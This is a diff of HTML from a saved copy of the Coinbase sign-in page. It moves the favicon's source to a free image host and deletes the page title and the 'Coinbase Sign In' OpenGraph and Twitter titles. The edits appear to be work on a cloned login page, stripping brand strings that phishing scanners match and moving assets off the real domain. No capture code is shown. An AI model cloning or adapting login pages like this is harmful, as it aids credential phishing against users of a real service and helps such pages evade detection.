@@ -1,11 +1,10 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en" class="js-focus-visible" data-js-focus-visible=""><head>
-<link rel="icon" data-savepage-href="https://login.coinbase.com/favicon.ico" href="data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAByUExURQAAAP///////////////////////////////////////////////////+/0/9/p/8/f/8/e/7/U/7/T/6/J/6C+/5++/4Cp/3+p/4Co/3+o/3Ce/2+e/3Cd/1CI/0B9/zBz/zBy/yBo/xBd/xBc/wBS/zO+XmcAAAANdFJOUwAQIDBfYI+Qn6DP3++j3GSfAAABQElEQVR42oWT25qCMAyEU5Rz/6KoKAsrKtv3f8W9gNKKfLtz16SdpJmJyAIVZ4UGXWR7JZ+IUo1HFq3SKmGF5I0lKgHqdnhZOw79AaAMSHYlUA92wXACyl343nzbN3TGc6gSqodd4VFBOfWRgPnIW/swkIiIRMC33UAHRCKSw9nFxnvb3kd3OkEqooDnHOkNQHVzfwGtJIbjHGjckBpPEUu+dPDlx9hNkRYyKWCa0Fj5C+bH1ShEw3S6h0qcm6ZpmjNoARa+Lfx/QcPrzxK+SePzlfVN5nD1o51xDb4ZQz3P5eLylzlwgL0o7WpY21YQWGMAlEjqKT7Fyma5uy25+1luScE8tw2Tess9Ny0XmnZVpTeh8SfbByRD/WZ7tzjHfhitfQ23er04Iipdi5SuFzjKg6xOo439VnE+r38cvP4FRD5MMjwxg0wAAAAASUVORK5CYII=">
+<link rel="icon" data-savepage-href="https://i.ibb.co/SXy9nh1w/favicon.png" href="data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAByUExURQAAAP///////////////////////////////////////////////////+/0/9/p/8/f/8/e/7/U/7/T/6/J/6C+/5++/4Cp/3+p/4Co/3+o/3Ce/2+e/3Cd/1CI/0B9/zBz/zBy/yBo/xBd/xBc/wBS/zO+XmcAAAANdFJOUwAQIDBfYI+Qn6DP3++j3GSfAAABQElEQVR42oWT25qCMAyEU5Rz/6KoKAsrKtv3f8W9gNKKfLtz16SdpJmJyAIVZ4UGXWR7JZ+IUo1HFq3SKmGF5I0lKgHqdnhZOw79AaAMSHYlUA92wXACyl343nzbN3TGc6gSqodd4VFBOfWRgPnIW/swkIiIRMC33UAHRCKSw9nFxnvb3kd3OkEqooDnHOkNQHVzfwGtJIbjHGjckBpPEUu+dPDlx9hNkRYyKWCa0Fj5C+bH1ShEw3S6h0qcm6ZpmjNoARa+Lfx/QcPrzxK+SePzlfVN5nD1o51xDb4ZQz3P5eLylzlwgL0o7WpY21YQWGMAlEjqKT7Fyma5uy25+1luScE8tw2Tess9Ny0XmnZVpTeh8SfbByRD/WZ7tzjHfhitfQ23er04Iipdi5SuFzjKg6xOo439VnE+r38cvP4FRD5MMjwxg0wAAAAASUVORK5CYII=">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
 
-    <title>Coinbase - Sign In</title>
 
     <meta name="theme-color" content="#0052ff">
 
@@ -38,15 +37,13 @@
     <!-- OpenGraph Tags -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://login.coinbase.com">
-    <meta property="og:title" content="Coinbase Sign In">
-    <meta property="og:site_name" content="Coinbase Sign In">
+
     <!-- NOTE: Description is not translated -->
     <meta property="description" name="description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing digital currency.">
 
     <!-- Twitter tags -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:url" content="https://login.coinbase.com">
-    <meta name="twitter:title" content="Coinbase Sign In">
 
     <script data-savepage-type="module" type="text/plain" crossorigin="" data-savepage-src="/e_DPxcZ6Go.js"></script>
     
